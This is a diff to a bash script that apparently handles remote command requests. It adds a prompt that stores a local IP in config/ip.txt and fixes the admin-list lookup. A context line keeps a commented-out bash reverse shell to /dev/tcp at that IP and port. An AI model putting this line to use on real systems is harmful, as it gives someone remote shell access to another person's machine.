@@ -29,6 +29,14 @@ data="Date Is: $date"
 echo $data
 }
 function cmmd(){
+local_ip="config/ip.txt"
+if [ ! -f "$local_ip" ];
+then
+    echo "Please Confirm Local IP"
+    read local_ip
+    echo "$local_ip" > config/ip.txt
+fi
+
 localip=`cat config/ip.txt`
 #/bin/bash -i >& /dev/tcp/$localip/$port 0>&1
 #
@@ -46,12 +54,12 @@ cmd_out_req=${arrIN[2]}
 #cmd_out_req=${arrIN[2]}
 echo "Reqesting Admin $cmd_out"
 echo "Requested Command $cmd_out_req"
-admin_list="config/admins.txt"
-if test -f "$admin_list";
+admin_file="config/admins.txt"
+if test -f "$admin_file";
 then
-    echo "$admin_list exists."
-
-    if grep -q $cmd_out "$File";
+    echo "$admin_file exists."
+    
+    if grep -q $cmd_out "$admin_file";
     then
         #  Some Actions # $string was found
         echo "Admin Authenticated"
